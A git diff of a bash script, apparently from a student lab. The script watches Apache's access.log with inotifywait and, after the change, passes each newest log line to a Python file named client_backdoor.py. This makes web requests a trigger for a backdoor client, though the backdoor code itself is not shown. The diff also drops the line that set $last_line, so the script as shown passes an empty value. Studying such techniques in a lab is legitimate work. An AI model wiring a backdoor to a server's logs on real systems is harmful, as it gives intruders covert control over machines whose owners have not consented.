@@ -1,26 +1,33 @@
 #!/bin/bash
-# NOTE:
-# 1. this script works.
-# 2. this script outputs new lines 
 
-# directory to monitor
 log_dir="/var/log/apache2"
 
+# NOTE !!: Change this path to your actual script location
+client_script="/home/student/Documents/python_scripts/server_client/client_backdoor.py"
 
-#-----Function to process new log files---
+# debug line: just to check that client_script file exists
+# handler should be used instead
+#cat "$client_script" | wc -l
+
+# Function to process new log files
 process_log() {
-    local log_file="$1" #arg 1 passed from monitor
-    tail -n 1 "$log_file" # output last line (newest line)
-}
-# Future improvements: consider 'lags' in inotifywait's calls (i.e. possible* skipping lines due to extremely fast writes)
-#----------------------------------------
 
-#---------- Monitoring-------------------
-# Monitor log directory for new access.log files, notice the pipe `|`
-inotifywait -m -e create -e modify --format '%f' "$log_dir" | # NOTE: monitors (-m) modify and create events (-e). --format affects output
-while read -r file; do # read the output of inotifywait
-    if [[ "$file" == "access.log" ]]; then # NOTE: call funciton IF file is access.log, in log rotation: this will always be the newest file
-        process_log "$log_dir/$file" # call function
+    local log_file="$1"
+
+    #debug line: check that last line has content
+    echo "Feeding: last line $last_line to python script"
+
+    # feed last_line to python client script
+    python3 "$client_script" "$last_line"
+
+    #THIS IS WRONG -> echo "$last_line" | python3 "$client_script"
+    #echo "New log file detected: $log_file"
+}
+
+# Monitor log directory for new access.log files
+inotifywait -m -e create -e modify --format '%f' "$log_dir" |
+while read -r file; do
+    if [[ "$file" == "access.log" ]]; then
+        process_log "$log_dir/$file"
     fi
 done
-#-----------------------------------------
